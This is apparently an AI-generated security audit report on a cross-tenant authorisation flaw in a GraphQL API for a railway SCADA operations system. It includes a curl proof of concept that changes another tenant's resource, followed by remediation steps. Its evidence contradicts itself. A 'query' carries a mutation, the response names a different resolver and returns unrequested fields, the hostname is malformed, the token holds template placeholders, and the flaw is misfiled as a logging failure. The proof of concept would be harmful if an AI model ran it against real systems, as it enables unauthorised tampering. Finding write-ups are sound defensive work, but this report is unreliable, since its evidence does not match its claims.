# Security Analysis Report
**System:** RailCore Operations API (Railway / SCADA)
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** GQL-0238 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Logging Failures / Pattern 7.1 | Operational PII/PHI leakage — cross-tenant railway SCADA data logged and exposed via `updateResource` response |

---

## Finding 1 — Operational PII Leakage via Cross-Tenant Resource Response (CRITICAL)

### Summary
The `updateResource` resolver on RailCore Operations API (`api.railcore-operations-.example.com`) returns sensitive operational data in the mutation response without verifying the requesting tenant's ownership of the resource. Per §5.0 Pattern 7.1, this constitutes operational PII/PHI leakage through logging failures: the `sensitiveField` and `internalNotes` returned in mutation responses may also be captured in application logs, API gateway logs, and audit trails — leaking cross-tenant railway SCADA operational data into multiple persistence layers. An attacker from `tenant-fd03` accesses resource `R-2238` belonging to `tenant-0f60`.

**Pattern:** 7.1 — Operational PII/PHI leakage (Logging Failures)
**Affected resolver:** `updateResource(id: ID!, input: ResourceInput!): Resource`
**Affected endpoint:** `POST https://api.railcore-operations-.example.com/graphql`

### Evidence from HAR

**Request (attacker `tenant-fd03`):**
```
POST https://api.railcore-operations-.example.com/graphql HTTP/2.0
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-fd03

{"query": "query VulnerableOp { updateResource(id: \"R-2238\", input: {status: \"approved\", ownerId: \"attacker-fd030f60\"}) { resourceId status } }"}
```

**Response (200 OK):**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-0f60",
      "ownerId": "other-user-fd030f60",
      "data": {
        "sensitiveField": "CONFIDENTIAL-fd030f60",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

**x-request-id:** `req-fd030f60`

The response exposes `sensitiveField: CONFIDENTIAL-fd030f60` and `internalNotes`. In a railway SCADA operations platform, this can include signal states, track occupancy data, control room configurations, and operator PII — all of which are critical infrastructure data that may also be captured in API gateway and application logs, compounding the breach across logging systems.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 RISK-GQL-238 | Resolver gap | No `tenantId` ownership check | Root cause |
| §5.0 Pattern 7.1 | Vulnerability | Operational PII/PHI in API response + logs | Classification |
| HAR request | `id` | `R-2238` | SCADA operations resource |
| HAR request | `x-tenant-id` | `tenant-fd03` | Attacker tenant |
| HAR response | `tenantId` | `tenant-0f60` | Victim tenant confirmed |
| HAR response | `sensitiveField` | `CONFIDENTIAL-fd030f60` | SCADA operational data leaked |
| HAR response | `internalNotes` | `Internal data exposed` | Operator notes in response |
| HAR headers | `x-request-id` | `req-fd030f60` | Correlation ID — appears in logs |

### Steps to Reproduce

**Step 1 — Obtain attacker JWT (tenant-fd03):**
```bash
ATTACKER_JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
```

**Step 2 — Access cross-tenant SCADA resource (VULNERABLE):**
```bash
curl -s -X POST https://api.railcore-operations-.example.com/graphql \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -H "x-tenant-id: tenant-fd03" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateResource(id: \"R-2238\", input: {status: \"approved\", ownerId: \"attacker-fd030f60\"}) { resourceId tenantId data { sensitiveField internalNotes } } }"}' \
  | jq '.data.updateResource'
# Expected VULNERABLE output: tenantId=tenant-0f60, sensitiveField=CONFIDENTIAL-fd030f60
```

**Step 3 — Check logs for leaked data:**
```bash
# Cross-tenant sensitiveField value appears in API gateway access logs under x-request-id=req-fd030f60
# Check: CloudWatch/Splunk/ELK for req-fd030f60 to find all persisted data paths
```

**Step 4 — Secure baseline (expected after fix):**
```bash
# Returns: {"errors":[{"message":"Forbidden: resource does not belong to your tenant"}]}
```

### Remediation

1. **Resolver tenancy check:** Verify `resource.tenantId === context.auth.tenantId`; reject with FORBIDDEN on mismatch.
2. **Log sanitization:** Remove or mask `sensitiveField` and `internalNotes` from all API response logs, gateway access logs, and debug traces — use structured log redaction.
3. **Sensitive field masking in responses:** Apply field-level masking on `sensitiveField` before returning in mutation responses when the requestor is not the resource owner.
4. **SCADA/critical infrastructure:** Railway operations data is critical national infrastructure — apply NIS2/IEC 62443 cybersecurity controls; unauthorized access to SCADA data is a reportable incident.
5. **Fix Redis cache key:** Include `tenantId` (§2.0 gap).
